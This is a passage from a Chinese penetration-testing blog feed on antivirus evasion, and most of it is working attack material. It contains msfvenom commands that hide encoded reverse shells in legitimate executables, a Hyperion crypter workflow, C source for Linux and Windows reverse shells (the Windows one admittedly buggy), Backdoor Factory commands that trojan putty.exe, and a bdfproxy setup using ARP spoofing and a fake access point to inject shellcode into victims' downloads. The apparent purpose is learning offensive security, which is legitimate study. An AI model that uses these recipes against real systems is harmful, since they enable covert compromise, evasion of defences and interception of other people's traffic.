b.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul><li>利用模板隐藏 shell</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o c.exe</span><br></pre></td></tr></table></figure><ul><li>多重编码</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul><li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li><li>Hyperion （32bit PE 程序加密器）</li><li>Crypter / Container（解密器 PE Loader ）</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure><ul><li>比较编码前后的检测率</li></ul><h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul><li>Windows reverse shell</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine gcc.exe windows.c -o windows.exe -lws2_32</span></span><br></pre></td></tr></table></figure><ul><li>Linux shell</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p><ul><li>linux_revers_shell.c</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: 192.168.153.166 4444\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>windows.c</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure><p><img src="20190413174154985.png" alt="在这里插入图片描述"></p><h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>patch<ul><li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>bdf：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法 patch</li><li>存在一定概率问价你会被 patch 坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li><li>支持 msf payload、自定义 payload</li></ul></li><li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li><li>python 语言编写</li><li>msf 使用的 patch 方法<ul><li>覆盖程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp</li></ul></li><li>创建新的线程执行 shellcode 并跳回原程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp –k</li><li>增加代码片段跳转执行后跳回源程序入口</li></ul></li></ul></li><li>CTP 方法<ul><li>增加新的代码段 session，与 smf 的-k 方法类似</li><li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li></ul></li><li>代码洞<ul><li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li><li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li></ul></li><li>单个代码洞代销不足以存放完整的 shellcode<ul><li>多代码洞跳转（非顺序执行）<ul><li>初期免杀率可达100%</li></ul></li><li>结合 msf 的 stager 方法</li></ul></li><li>patch 选项<ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码注入</li></ul></li><li>BDF 基本使用<ul><li>检查二进制文件是否支持代码注入<ul><li>backdoor-factory -f putty.exe –S</li></ul></li><li>显示可用 payload<ul><li>backdoor-factory -f putty.exe -s show</li><li>backdoor-factory -f <code>which nc</code> -s show</li><li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li><li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li><li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li></ul></li><li>查看 cave 大小<ul><li>ackdoor-factory -f putty.exe -c -l</li></ul></li></ul></li><li>免杀效果对比<ul><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li></ul></li><li>与 veil-evasion 集成</li><li>Linux：backdoor-factory -f putty.exe -s show</li><li>IAT：import address table</li><li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li></ul><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>-S：检查二进制文件是否支持代码注入</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe –S</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure><ul><li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure><ul><li><p>注入 putty.exe，报错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li><p>显示未找到文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure></li><li><p>修复错误（备份并重命名）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure></li><li><p>使用 msf 侦听</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure></li><li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p></li><li><p>免杀效果比较</p><p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty3.exe</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty4.exe –J</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty5.exe -a</span><br></pre></td></tr></table></figure><ul><li><p>与 veil-evasion 集成</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil-evasion</span><br><span class="line">[<span class="symbol">menu&gt;&gt;</span>]: <span class="link">list</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>Bdfproxy（mitmproxy）<ul><li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li></ul></li><li>步骤<ul><li>sysctl -w net.ipv4.ip_forward=1</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li><li>vi /etc/bdfproxy/bdfproxy.cfg<ul><li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li></ul></li></ul></li><li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li><li>启动 msf</li><li>流程<ul><li>mana 创建 Fack AP</li><li>badfproxy 代理注入代码</li><li>msf 侦听反弹 shell</li></ul></li></ul><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>修改 IP 转发</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vim /etc/sysctl.conf </span></span><br><span class="line">net.ipv4.ip_forward=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>修改 iptables</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# vim /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent  </span><br><span class="line">HOST = <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>     #<span class="number">108</span>行，<span class="number">117</span>行，<span class="number">128</span>行，替换所有的，有<span class="number">6</span>个</span><br></pre></td></tr></table></figure></li><li><p>启动 bdfproxy</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># bdfproxy</span></span><br></pre></td></tr></table></figure></li><li><p>启动 msfconsole</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole -r /root/bdfproxy_msf_resource.rc</span></span><br><span class="line">msf exploit(multi/handler) &gt; jobs</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>arp 欺骗</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# arpspoof -i eth0 -t <span class="number">10.10</span><span class="number">.10</span><span class="number">.133</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure></li><li><p>靶机访问浏览器下载软件，并运行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/1qLFgFZ.png)</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul><li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p><ul><li>修改无线 SSID 名称</li></ul></li><li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p><ul><li>修改 wlan1 无线网卡适配器并启动</li><li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li></ul></li><li><p>vi /etc/bdfproxy/bdfproxy.cfg</p><ul><li>proxyMode = transparent</li><li>修改侦听 IP 地址并启动 badfproxy</li></ul></li><li><p>启动 msf</p><ul><li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li></ul></li><li><p>补充内容</p><ul><li>全站 HTTPS 防注入（微软每个补丁都带码）</li><li>PE 文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul><li>全部用 0 覆盖</li><li>BDF 默认清除数字签名</li></ul></li></ul></li><li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p><ul><li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li><li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li></ul></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p><ul><li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;a href=&quot;#渗透测试——免杀部分知识&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;/a&gt;渗透测试——免杀部分知识&lt;/h2&gt;&lt;h4 id=&quot;1-恶意软件&quot;&gt;&lt;a href=&quot;#1-恶意软件&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>msf后渗透部分学习</title>
    <link href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</id>
    <published>2020-04-28T04:36:04.000Z</published>
    <updated>2020-06-05T11:37:28.474Z</updated>
    
